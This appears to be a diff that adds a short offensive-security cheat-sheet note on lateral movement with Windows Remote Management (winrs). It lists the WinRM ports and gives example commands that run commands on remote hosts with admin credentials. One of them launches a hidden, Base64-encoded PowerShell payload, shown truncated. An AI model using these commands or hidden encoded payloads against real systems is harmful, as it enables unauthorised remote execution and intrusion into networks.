@@ -1,0 +1,10 @@
+WinRM have this utility
+Need to be Admin ando DOMAIN user
+5986 HTTPS 
+5985 HTTP
+
+# Will run hostname and whoami:
+winrs -r:10.0.0.3 -u:admin -p:Secret!  "cmd /c hostname & whoami"
+
+# Will run Base64 powershell encoded payload:
+winrs -r:files04 -u:admin -p:Secret!  "powershell -nop -w hidden -e JABjAGwAaQB...AHMAZQAoACkA"
